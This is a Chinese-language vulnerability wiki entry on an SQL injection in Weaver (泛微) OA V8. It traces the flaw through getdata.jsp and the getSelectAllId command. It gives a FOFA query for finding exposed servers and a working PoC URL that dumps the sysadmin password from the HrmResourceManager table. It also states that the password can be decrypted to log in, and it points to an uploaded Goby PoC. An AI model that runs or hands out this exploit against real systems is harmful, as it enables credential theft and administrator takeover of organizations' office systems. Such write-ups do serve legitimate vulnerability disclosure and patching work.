# 泛微OA V8 SQL注入漏洞

## 漏洞描述

泛微OA V8 存在SQL注入漏洞，攻击者可以通过漏洞获取管理员权限和服务器权限

## 漏洞影响

> [!NOTE]
>
> 泛微OA V8

## FOFA

> [!NOTE]
>
> app="泛微-协同办公OA"

## 漏洞复现

在getdata.jsp中，直接将request对象交给

**weaver.hrm.common.AjaxManager.getData(HttpServletRequest, ServletContext) : **

方法处理

![](http://wikioss.peiqi.tech/vuln/fanwei-17.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

在getData方法中，判断请求里cmd参数是否为空，如果不为空，调用proc方法

![](http://wikioss.peiqi.tech/vuln/fanwei-18.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

Proc方法4个参数，(“空字符串”,”cmd参数值”,request对象，serverContext对象)

在proc方法中，对cmd参数值进行判断，当cmd值等于getSelectAllId时，再从请求中获取sql和type两个参数值，并将参数传递进getSelectAllIds（sql,type）方法中

![](http://wikioss.peiqi.tech/vuln/fanwei-19.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

根据以上代码流程，只要构造请求参数

?cmd= getSelectAllId&sql=select password as id from userinfo;

即可完成对数据库操控

POC

```
http://xxx.xxx.xxx.xxx/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager
```

查询HrmResourceManager表中的password字段，页面中返回了数据库第一条记录的值（sysadmin用户的password）

![](http://wikioss.peiqi.tech/vuln/fanwei-20.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

解密后即可登录系统

![](http://wikioss.peiqi.tech/vuln/fanwei-21.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

##  Goby & POC

> [!NOTE]
>
> 已上传 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC 目录中
>
> Weaver OA 8 SQL injection

![](http://wikioss.peiqi.tech/vuln/fanwei-22.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

